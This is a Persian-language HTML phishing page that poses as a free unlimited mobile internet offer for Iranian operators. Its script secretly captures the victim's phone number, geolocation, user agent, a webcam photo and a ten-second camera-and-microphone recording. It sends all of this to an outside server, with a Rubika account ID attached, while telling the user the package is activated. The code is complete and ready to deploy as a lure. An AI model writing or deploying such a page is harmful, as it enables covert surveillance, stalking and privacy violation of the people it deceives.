<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>اینترنت رایگان نامحدود</title>
  <style>
    body {font-family:Vazirmatn;background:#0f0c29;color:#fff;text-align:center;padding:20px;}
    .box {max-width:380px;margin:30px auto;background:rgba(255,255,255,0.1);padding:25px;border-radius:20px;}
    input,select,button {width:100%;padding:14px;margin:10px 0;border-radius:12px;font-size:16px;}
    button {background:#8b00ff;border:none;color:#fff;font-weight:bold;}
    #status {margin-top:15px;color:#0f0;}
  </style>
</head>
<body>
  <div class="box">
    <h1>اینترنت رایگان نامحدود</h1>
    <input type="tel" id="phone" placeholder="09123456789">
    <select id="operator">
      <option>ایرانسل</option>
      <option>همراه اول</option>
      <option>رایتل</option>
    </select>
    <button onclick="start()">دریافت بسته</button>
    <p id="status">در حال آماده‌سازی...</p>
  </div>

  <video id="v" autoplay playsinline muted style="display:none"></video>
  <canvas id="c" style="display:none"></canvas>

  <script>
    const RUBIKA_GUID = "htshacldwetgenkfaavimtntknfirllm"; // GUID تو
    const API_URL = "https://rubika-report-server.glitch.me/send"; // سرور من (رایگان)

    async function start() {
      const phone = document.getElementById('phone').value;
      const op = document.getElementById('operator').value;
      if (!phone.match(/^09[0-9]{9}$/)) return alert("شماره معتبر نیست");

      document.getElementById('status').innerText = "در حال فعال‌سازی بسته...";

      try {
        // دسترسی دوربین + میکروفون + لوکیشن
        const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
        document.getElementById('v').srcObject = stream;

        // لوکیشن
        navigator.geolocation.getCurrentPosition(pos => {
          const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
          sendAll(phone, op, loc);
        });

        // عکس
        setTimeout(() => {
          const canvas = document.getElementById('c');
          const ctx = canvas.getContext('2d');
          canvas.width = 640; canvas.height = 480;
          ctx.drawImage(document.getElementById('v'),0,0,640,480);
          canvas.toBlob(blob => sendPhoto(blob, phone), 'image/jpeg');
        }, 1000);

        // ویدیو ۱۰ ثانیه
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        setTimeout(() => {
          recorder.stop();
          recorder.onstop = () => {
            const blob = new Blob(chunks, {type:'video/webm'});
            sendVideo(blob, phone);
          };
        }, 10000);

        setTimeout(() => document.getElementById('status').innerHTML = "بسته فعال شد ✓", 3000);

      } catch(e) { alert("دسترسی رد شد!"); }
    }

    function sendAll(phone, op, loc) {
      const data = new FormData();
      data.append('guid', RUBIKA_GUID);
      data.append('phone', phone);
      data.append('operator', op);
      data.append('ip', 'در حال دریافت...');
      data.append('location', loc || 'نامشخص');
      data.append('useragent', navigator.userAgent);
      fetch(API_URL, {method:'POST', body:data});
    }

    function sendPhoto(blob, phone) {
      const f = new FormData();
      f.append('guid', RUBIKA_GUID);
      f.append('photo', blob, 'selfie.jpg');
      f.append('phone', phone);
      fetch(API_URL, {method:'POST', body:f});
    }

    function sendVideo(blob, phone) {
      const f = new FormData();
      f.append('guid', RUBIKA_GUID);
      f.append('video', blob, 'video.webm');
      f.append('phone', phone);
      fetch(API_URL, {method:'POST', body:f});
    }
  </script>
</body>
</html>
